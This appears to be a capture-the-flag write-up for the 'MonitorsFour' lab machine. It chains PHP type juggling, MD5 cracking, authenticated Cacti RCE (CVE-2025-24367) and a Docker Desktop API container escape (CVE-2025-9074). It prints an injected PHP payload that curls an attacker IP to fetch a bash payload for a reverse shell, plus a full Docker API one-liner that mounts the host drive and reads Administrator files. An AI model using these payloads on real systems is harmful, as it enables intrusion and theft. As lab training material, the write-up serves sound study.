---
layout: post
title: "MonitorsFour"
date: 2025-12-11 00:00:00 -0400
author: Hugo Beaulieu
categories: windows machine
tags: windows docker cacti cve-2025-24367 cve-2025-9074 php-type-juggling api-enumeration
---

## Overview

MonitorsFour is a Windows machine running a PHP web application and Cacti network monitoring system in Docker containers. The exploitation chain involves API enumeration through PHP type juggling to discover user credentials, hash cracking to gain admin access, authenticated remote code execution in Cacti via CVE-2025-24367, and container escape through CVE-2025-9074 in Docker Desktop to access the Windows host filesystem.

## Initial Enumeration

### Nmap Scan

We start with an nmap scan to identify open ports and services:

```bash
nmap -sV -v monitorsfour.htb
```

Results:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Running: Microsoft Windows 2022 (88%)
```

Two services are exposed:

- An nginx web server on port 80
- WinRM on port 5985 (requires credentials)

### UDP Scan

We also perform a UDP scan but find no additional services:

```bash
nmap -sU --top-ports 100 monitorsfour.htb
```

### Enum4linux Attempt

We attempt anonymous enumeration with enum4linux:

```bash
enum4linux -a monitorsfour.htb
```

Results:

```
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking SMB
[-] Could not connect to SMB on 445/tcp: timed out

[!] Aborting remainder of tests since neither SMB nor LDAP are accessible
```

No SMB or LDAP services are available.

### Subdomain Enumeration

Using ffuf to discover subdomains:

```bash
ffuf -w wordlist.txt -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -mc 200,301,302 -fs 0
```

Result:

```
[Status: 302, Size: 0] [--> /cacti]
    * FUZZ: cacti
```

We add the subdomain to our hosts file:

```bash
echo "10.129.33.189 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

## Web Application Analysis

### Main Application Discovery

Accessing `http://monitorsfour.htb` reveals a PHP-based networking solutions website with login functionality.

### Technology Stack

Session cookies indicate PHP backend:

```
PHPSESSID=<session_id>
```

### Directory Enumeration

Running gobuster reveals several interesting paths:

```bash
gobuster dir -u http://monitorsfour.htb -w wordlist.txt
```

Results:

```
/.env                 (Status: 200) [Size: 97]
/login                (Status: 200) [Size: 4340]
/contact              (Status: 200) [Size: 367]
/forgot-password      (Status: 200) [Size: 3099]
/user                 (Status: 200) [Size: 35]
/static               (Status: 301) [--> http://monitorsfour.htb/static/]
/controllers          (Status: 301)
/views                (Status: 301)
```

### Environment File Discovery

The `.env` file exposes database credentials:

```bash
curl http://monitorsfour.htb/.env
```

Contents:

```conf
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=[REDACTED]
```

Key observations:

- Database host is named `mariadb` (suggests Docker networking)
- Credentials obtained: `monitorsdbuser:[REDACTED]`

### API Endpoint Discovery

Examining the login page source reveals API endpoints:

```
POST http://monitorsfour.htb/api/v1/auth
POST http://monitorsfour.htb/api/v1/reset
```

### Web Crawler Analysis

Using Katana to crawl the application:

```bash
katana -u http://monitorsfour.htb
```

The crawler confirms this is a PHP application with Bootstrap framework and custom JavaScript.

## PHP Type Juggling Attack

### Testing the User Endpoint

Attempting to access the `/user` endpoint without authentication:

```bash
curl http://monitorsfour.htb/user
```

Response:

```json
{ "error": "Missing token parameter" }
```

### Exploiting Loose Comparison

Testing with a random token:

```bash
curl http://monitorsfour.htb/user?token=test
```

Response:

```json
{ "error": "Invalid or missing token" }
```

### Successful Type Juggling

PHP's loose comparison (`==`) can be exploited when comparing strings to integers. We test with `token=0`:

```bash
curl http://monitorsfour.htb/user?token=0
```

Success! The application returns all users:

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "[REDACTED]",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```

## Hash Cracking

### Hash Identification

Using name-that-hash to identify the hash type:

```bash
nth -t "[REDACTED]"
```

Result:

```
Most Likely
MD5, HC: 0 JtR: raw-md5
```

### Cracking with Hashcat

We extract the admin hash and crack it with hashcat:

```bash
echo "[REDACTED]" > hash.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4
```

Result:

```
[REDACTED]:[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
```

Credentials obtained: `admin:[REDACTED]`

## Admin Panel Access

### Logging In

We log in to the main application using `admin:[REDACTED]` and gain access to the admin dashboard at:

```
http://monitorsfour.htb/admin/dashboard
```

### Admin Panel Exploration

The admin panel reveals several sections:

```
/admin/dashboard
/admin/tasks
/admin/invoices
/admin/users
/admin/customers
/admin/changelog
/admin/api
```

### Changelog Discovery

Accessing the changelog provides critical information:

```
http://monitorsfour.htb/admin/changelog
```

Key findings:

- **API Functionality**: "Introduced API user functionality to support automation and system-to-system communication"
- **Docker Deployment**: "To enhance our product delivery, we have migrated to Windows and ported websites to Docker via Docker Desktop 4.44.2"
- **Security Patch**: "A critical security issue in the forgotten password form was patched. The vulnerability allowed potential attackers to exploit error-based SQL injection"

This confirms:

- The application is running in a Docker container
- The host OS is Windows
- Docker Desktop version 4.44.2 is in use (potentially vulnerable)

## Cacti Access

### Cacti Version Discovery

Accessing `http://cacti.monitorsfour.htb` shows the login page for **Cacti version 1.2.28**.

### Credential Testing

We test various credential combinations:

```
admin:[REDACTED] - Failed
mhiggins:[REDACTED] - Failed
marcus:[REDACTED] - Success!
```

The credentials `marcus:[REDACTED]` grant us authenticated access to Cacti.

### Vulnerability Research

Searching for Cacti 1.2.28 vulnerabilities reveals multiple CVEs:

- CVE-2024-45598
- CVE-2024-54145
- CVE-2024-54146
- CVE-2025-22604
- CVE-2025-24367 (RCE - most promising)
- CVE-2025-24368
- CVE-2025-26520
- CVE-2025-66399

We focus on **CVE-2025-24367** as it provides authenticated remote code execution.

## CVE-2025-24367 Exploitation

### Finding the Exploit

We discover a proof-of-concept on GitHub:

```
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
```

### Setting Up the Attack

First, we start a netcat listener:

```bash
nc -lvnp 4444
```

### Executing the Exploit

We run the exploit with our authenticated credentials:

```bash
python3 exploit.py \
  -u marcus \
  -p [REDACTED] \
  -i 10.10.14.18 \
  -l 4444 \
  -url http://cacti.monitorsfour.htb \
  --http-port 8080
```

Exploit output:

```
[+] Cacti Instance Found!
[+] Serving HTTP on port 8080
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: Zsgne.php
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph Zsgne.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`curl\x2010.10.14.18\x3a8080/bash\x20>bash`;?>

[+] Got payload: /bash
[i] Created PHP filename: 5LXXP.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 8080
```

### Shell Access

We receive a connection on our netcat listener:

```bash
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.33.189] 58931
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

Success! We have a shell as `www-data` inside the Docker container.

## Container Reconnaissance

### Database Connection Attempt

We attempt to connect to the database using the credentials from the `.env` file:

```bash
mysql -h localhost -u monitorsdbuser -p -D monitorsfour_db
# Password: [REDACTED]
```

Result:

```
ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2)
```

### Service Check

We verify if MariaDB is running locally:

```bash
service mariadb status
```

Result:

```
grep: /etc/init.d/mariadb: No such file or directory
mariadb: unrecognized service
```

The database is hosted on a separate container, confirming a multi-container Docker setup.

### User Flag

We explore the filesystem and find the user flag:

```bash
cd /home
ls
marcus

cd marcus
cat user.txt
[REDACTED]
```

## Container Escape via CVE-2025-9074

### Vulnerability Research

From the changelog, we know Docker Desktop 4.44.2 is in use. Research reveals **CVE-2025-9074**, which allows unauthorized access to the Docker daemon on Docker Desktop.

The vulnerability exposes the Docker API on `192.168.65.7:2375` without authentication, allowing us to:

- Create containers with arbitrary host mounts
- Execute commands with host filesystem access

### Exploitation Strategy

We create a Bash one-liner that:

1. Creates a new container with the Windows C: drive mounted
2. Uses Alpine Linux as the base image
3. Executes `cat` to read the root flag
4. Returns the flag contents

### Executing the Exploit

```bash
curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","HostConfig":{"Binds":["/run/desktop/mnt/host/c:/mnt/c"]},"Cmd":["cat","/mnt/c/Users/Administrator/Desktop/root.txt"]}' \
  | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 \
  | xargs -I {} sh -c "curl -s -X POST http://192.168.65.7:2375/containers/{}/start && sleep 1 && curl -s 'http://192.168.65.7:2375/containers/{}/logs?stdout=true&stderr=true'"
```

This command:

- Creates a container via the Docker API
- Mounts the Windows C: drive at `/mnt/c` inside the container
- Starts the container and reads `/mnt/c/Users/Administrator/Desktop/root.txt`
- Outputs the root flag

### Root Flag

The exploit successfully returns the root flag, demonstrating complete compromise of the Windows host through the Docker Desktop vulnerability.

## Key Takeaways

- **PHP Type Juggling**: Loose comparison operators (`==`) can be exploited when comparing strings to integers, bypassing token authentication
- **Environment file exposure**: `.env` files should never be web-accessible and can leak database credentials
- **Subdomain enumeration**: Always check for subdomains that might host additional applications
- **Credential reuse**: Users often reuse passwords across different systems (admin password worked for Cacti)
- **Changelog information**: Changelogs can reveal infrastructure details, deployment methods, and software versions
- **Authenticated CVEs**: Many critical vulnerabilities require authentication, making credential discovery essential
- **CVE-2025-24367**: Cacti 1.2.28 allows authenticated RCE through graph manipulation and PHP injection
- **Docker Desktop CVE-2025-9074**: Exposes the Docker daemon API without authentication, allowing container creation with arbitrary host mounts
- **Container escape**: Docker API access enables complete host compromise by mounting host filesystems
- **MD5 hash weakness**: MD5 remains easily crackable with modern tools and wordlists
